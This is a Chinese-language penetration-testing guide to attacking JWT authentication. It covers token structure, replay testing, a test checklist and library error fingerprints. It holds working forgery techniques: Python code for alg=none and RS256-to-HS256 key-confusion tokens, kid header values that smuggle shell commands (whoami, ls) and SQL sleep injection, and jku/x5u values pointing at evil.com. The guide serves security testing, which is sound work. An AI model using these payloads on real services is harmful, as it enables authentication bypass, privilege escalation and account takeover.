# JWT 认证测试

## 1. 概述

JWT（JSON Web Token）认证测试主要检查 Token 的生成、验证和使用是否存在安全漏洞。

**危险等级**: 高

## 2. JWT 结构

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMDB9.fake_signature
|__________||__________________________________||_____________|
   Header           Payload                        Signature
```

### 2.1 Header 解析

```json
{"alg": "HS256", "typ": "JWT"}
```

### 2.2 Payload 解析

```json
{"sub": "admin", "role": "admin", "iat": 1600000000, "exp": 1600003600}
```

## 3. 测试方法

### 3.1 空 Token 测试

```bash
# 无 Token
GET /api/user/info
Headers: {}

# 空 Authorization
GET /api/user/info
Headers: {"Authorization": ""}

# 无效格式
GET /api/user/info
Headers: {"Authorization": "fake_token"}
```

### 3.2 算法篡改

```bash
# alg=none - 删除签名
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

# alg=HS256 → HS384
# alg=HS256 → HS512
# alg=RSA → HMAC (key confusion)
```

### 3.3 密钥混淆攻击

```bash
# 使用公钥作为密钥（适用于 RS256 → HS256）
# 获取公钥
GET /api/publickey
# 然后使用公钥伪造 Token
```

### 3.4 kid 注入

```bash
# kid 参数命令注入
{"kid": "xxx|whoami"}
{"kid": "xxx\"; ls; echo \""}
{"kid": "xxx' AND SLEEP(3)--"}
```

### 3.5 jku/x5u 注入

```bash
# 控制密钥来源
{"jku": "http://evil.com/jwks.json"}
{"x5u": "http://evil.com/cert.pem"}
```

### 3.6 常用 JWT Header

| Header | 说明 |
|--------|------|
| Authorization | `Bearer <token>` |
| X-Token | 自定义 Token 头 |
| token | 参数名 token |
| Admin-Token | 管理员专用 |

## 4. JWT 伪造攻击示例

### 4.1 alg=none 攻击

```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1600000000}

def b64url_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).rstrip(b'=').decode()

header_enc = b64url_encode(header)
payload_enc = b64url_encode(payload)

fake_token = f"{header_enc}.{payload_enc}."
print(fake_token)
```

### 4.2 密钥混淆攻击

```python
# 获取公钥（通常用于验证 RS256）
public_key = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"

# 使用公钥作为密钥签发 HS256 Token
import jwt
token = jwt.encode(
    {"sub": "admin"},
    public_key,
    algorithm="HS256"
)
```

## 5. Token 安全检查

### 5.1 检查项

| 检查项 | 安全配置 |
|--------|----------|
| alg | 应为 RS256/ES256，不应为 none/HS256 |
| exp | 应存在且合理（不超过24小时） |
| iss | 应存在且可信 |
| aud | 应存在且为当前应用 |
| jti | 唯一标识，防重放 |

### 5.2 不安全的 JWT 配置

```json
{"alg": "none"}
{"alg": "HS256", "secret": "secret123"}
{"alg": "HS256", "key": "shared_secret"}
```

## 6. 重放攻击测试

```bash
# 1. 获取有效 Token
POST /api/login
{"username": "admin", "password": "xxx"}
# 返回: {"token": "eyJhbGc..."}

# 2. 重放 Token
GET /api/user/info
Headers: {"Authorization": "Bearer eyJhbGc..."}

# 3. 检查是否每次都生成新 Token
# 如果 Token 可重放且不变 → 存在重放风险
```

## 7. 关联漏洞

| 后续漏洞 | 利用路径 |
|----------|----------|
| 垂直越权 | 伪造 admin 角色 |
| 水平越权 | 篡改 userId |
| 账户接管 | 修改用户信息 |

## 8. 测试检查清单

```
□ 解析 Token 结构（Header, Payload, Signature）
□ 测试空 Token 访问
□ 测试 alg=none 绕过
□ 测试算法篡改（HS256 → HS384/512）
□ 测试密钥混淆攻击
□ 测试 kid 注入
□ 测试 jku/x5u 注入
□ 检查 Token 过期时间（exp）
□ 检查重放攻击
□ 评估伪造难度和影响
```

## 9. JWT 库指纹

| 库 | 错误信息特征 |
|----|--------------|
| pyjwt | "Signature verification failed" |
| node-jsonwebtoken | "invalid signature" |
| java-jwt | "Signature verification errors" |
| go-jwt | "signature is invalid" |
